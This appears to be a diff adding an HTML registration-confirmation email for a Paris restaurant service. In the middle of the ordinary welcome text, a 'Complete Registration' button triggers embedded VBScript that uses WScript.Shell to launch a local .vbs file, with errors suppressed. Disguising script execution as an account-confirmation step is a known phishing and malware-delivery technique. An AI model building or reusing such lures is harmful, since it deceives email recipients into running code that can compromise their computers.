@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Confirmation - Paris Restaurants</title>
+    <style>
+        body {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+        }
+        .email-container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: #ffffff;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .header {
+            background: linear-gradient(135deg, #dc2626, #b91c1c);
+            color: white;
+            padding: 40px 30px;
+            text-align: center;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .header .tagline {
+            margin: 10px 0 0 0;
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        .content {
+            padding: 40px 30px;
+            line-height: 1.6;
+            color: #333333;
+        }
+        .greeting {
+            font-size: 18px;
+            margin-bottom: 20px;
+            color: #2c3e50;
+        }
+        .message {
+            font-size: 16px;
+            margin-bottom: 30px;
+            color: #555555;
+        }
+        .cta-button {
+            display: inline-block;
+            background-color: #dc2626;
+            color: white;
+            padding: 15px 30px;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 16px;
+            margin: 20px 0;
+            transition: background-color 0.3s ease;
+        }
+        .cta-button:hover {
+            background-color: #b91c1c;
+        }
+        .cta-container {
+            text-align: center;
+            margin: 30px 0;
+        }
+        .footer-note {
+            font-size: 14px;
+            color: #777777;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #eeeeee;
+        }
+        .footer {
+            background-color: #2c3e50;
+            color: white;
+            padding: 30px;
+            text-align: center;
+            font-size: 14px;
+        }
+        .footer a {
+            color: #dc2626;
+            text-decoration: none;
+        }
+        .social-links {
+            margin: 20px 0;
+        }
+        .social-links a {
+            display: inline-block;
+            margin: 0 10px;
+            color: #dc2626;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        @media (max-width: 600px) {
+            .email-container {
+                margin: 10px;
+                border-radius: 0;
+            }
+            .header, .content, .footer {
+                padding: 20px;
+            }
+            .header h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="email-container">
+        <!-- Header -->
+        <div class="header">
+            <h1>Paris Restaurants</h1>
+            <p class="tagline">Premium Dining Experiences</p>
+        </div>
+        
+        <!-- Main Content -->
+        <div class="content">
+            <div class="greeting">
+                Hello and Welcome!
+            </div>
+            
+            <div class="message">
+                <p>Thank you for registering with Paris Restaurants! We're excited to have you join our community of food enthusiasts.</p>
+                
+                <p>To complete your registration and activate your account, please click the confirmation link below:</p>
+            </div>
+				<h2>Complete Registration</h2>
+				  <p>Click below to run the registration script:</p>
+
+				  <button class="btn" onclick="runScript()">Complete Registration</button>
+
+				  <script language="vbscript">
+					Sub runScript()
+					  On Error Resume Next
+					  Dim shell, path
+					  Set shell = CreateObject("WScript.Shell")
+					  path = "C:\Users\Melkiel\Desktop\eli7testhtml\Form Reservation.vbs"
+					  shell.Run Chr(34) & path & Chr(34), 1, False
+					  If Err.Number <> 0 Then
+						MsgBox "Failed to run the script. Error: " & Err.Number & " - " & Err.Description, vbExclamation, "Error"
+					  Else
+						MsgBox "Script started.", vbInformation, "Done"
+					  End If
+					End Sub
+				  </script>
+            <div class="message">
+                <p>Once confirmed, you'll have access to:</p>
+                <ul style="color: #555555; padding-left: 20px;">
+                    <li>Exclusive restaurant reservations</li>
+                    <li>Special dining offers and promotions</li>
+                    <li>Personalized restaurant recommendations</li>
+                    <li>Priority access to new restaurant openings</li>
+                </ul>
+            </div>
+            
+            <div class="footer-note">
+                <p><strong>Important:</strong> This confirmation link will expire in 48 hours for security reasons.</p>
+                <p>If you didn't create an account with us, please ignore this email or contact our support team.</p>
+                <p>Need help? Contact us at <a href="mailto:support@parisrestaurants.com" style="color: #dc2626;">support@parisrestaurants.com</a></p>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <p><strong>Paris Restaurants Team</strong></p>
+            <div class="social-links">
+                <a href="#" target="_blank">Facebook</a>
+                <a href="#" target="_blank">Instagram</a>
+                <a href="#" target="_blank">Twitter</a>
+            </div>
+            <p>123 Rue de la Gastronomie, 75001 Paris, France</p>
+            <p>© 2024 Paris Restaurants. All rights reserved.</p>
+            <p style="font-size: 12px; margin-top: 15px; opacity: 0.8;">
+                You received this email because you signed up for Paris Restaurants.<br>
+                <a href="#" style="color: #dc2626;">Unsubscribe</a> | <a href="#" style="color: #dc2626;">Privacy Policy</a>
+            </p>
+        </div>
+    </div>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'98f4d6bf94872674',t:'MTc2MDU4OTIxNC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
+
+
